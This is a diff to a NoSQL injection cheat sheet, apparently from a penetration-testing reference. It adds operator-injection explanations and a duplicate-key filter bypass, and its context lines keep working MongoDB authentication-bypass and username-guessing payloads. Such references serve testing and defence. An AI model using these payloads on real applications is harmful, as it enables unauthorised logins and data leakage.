@@ -6,9 +6,11 @@
 
 * [Tools](#tools)
 * [Methodology](#methodology)
+    * [Operator Injection](#operator-injection)
     * [Authentication Bypass](#authentication-bypass)
     * [Extract Length Information](#extract-length-information)
     * [Extract Data Information](#extract-data-information)
+    * [WAF and Filters](#waf-and-filters)
 * [Blind NoSQL](#blind-nosql)
     * [POST with JSON Body](#post-with-json-body)
     * [POST with urlencoded Body](#post-with-urlencoded-body)
@@ -24,11 +26,37 @@
 
 ## Methodology
 
+NoSQL injection occurs when an attacker manipulates queries by injecting malicious input into a NoSQL database query. Unlike SQL injection, NoSQL injection often exploits JSON-based queries and operators like `$ne`, `$gt`, `$regex`, or `$where` in MongoDB.
+
+### Operator Injection
+
+| Operator | Description        |
+| -------- | ------------------ |
+| $ne      | not equal          |
+| $regex   | regular expression |
+| $gt      | greater than       |
+| $lt      | lower than         |
+| $nin     | not in             |
+
+Example: A web application has a product search feature
+
+```js
+db.products.find({ "price": userInput })
+```
+
+An attacker can inject a NoSQL query: `{ "$gt": 0 }`.
+
+```js
+db.products.find({ "price": { "$gt": 0 } })
+```
+
+Instead of returning a specific product, the database returns all products with a price greater than zero, leaking data.
+
 ### Authentication Bypass
 
 Basic authentication bypass using not equal (`$ne`) or greater (`$gt`)
 
-* in HTTP data
+* HTTP data
 
   ```ps1
   username[$ne]=toto&password[$ne]=toto
@@ -37,7 +65,7 @@ Basic authentication bypass using not equal (`$ne`) or greater (`$gt`)
   login[$nin][]=admin&login[$nin][]=test&pass[$ne]=toto
   ```
 
-* in JSON data
+* JSON data
 
   ```json
   {"username": {"$ne": null}, "password": {"$ne": null}}
@@ -83,6 +111,18 @@ Extract data with "`$in`" query operator.
 ```json
 {"username":{"$in":["Admin", "4dm1n", "admin", "root", "administrator"]},"password":{"$gt":""}}
 ```
+
+### WAF and Filters
+
+**Remove pre-condition**:
+
+In MongoDB, if a document contains duplicate keys, only the last occurrence of the key will take precedence.
+
+```js
+{"id":"10", "id":"100"} 
+```
+
+In this case, the final value of "id" will be "100".
 
 ## Blind NoSQL
 
@@ -198,8 +238,10 @@ end
 ## References
 
 * [Burp-NoSQLiScanner - matrix - January 30, 2021](https://github.com/matrix/Burp-NoSQLiScanner/blob/main/src/burp/BurpExtender.java)
+* [Getting rid of pre- and post-conditions in NoSQL injections - Reino Mostert - March 11, 2025](https://sensepost.com/blog/2025/getting-rid-of-pre-and-post-conditions-in-nosql-injections/)
 * [Les NOSQL injections Classique et Blind: Never trust user input - Geluchat - February 22, 2015](https://www.dailysecurity.fr/nosql-injections-classique-blind/)
 * [MongoDB NoSQL Injection with Aggregation Pipelines - Soroush Dalili (@irsdl) - June 23, 2024](https://soroush.me/blog/2024/06/mongodb-nosql-injection-with-aggregation-pipelines/)
+* [NoSQL error-based injection - Reino Mostert - March 15, 2025](https://sensepost.com/blog/2025/nosql-error-based-injection/)
 * [NoSQL Injection in MongoDB - Zanon - July 17, 2016](https://zanon.io/posts/nosql-injection-in-mongodb)
 * [NoSQL injection wordlists - cr0hn - May 5, 2021](https://github.com/cr0hn/nosqlinjection_wordlists)
 * [Testing for NoSQL injection - OWASP - May 2, 2023](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection)
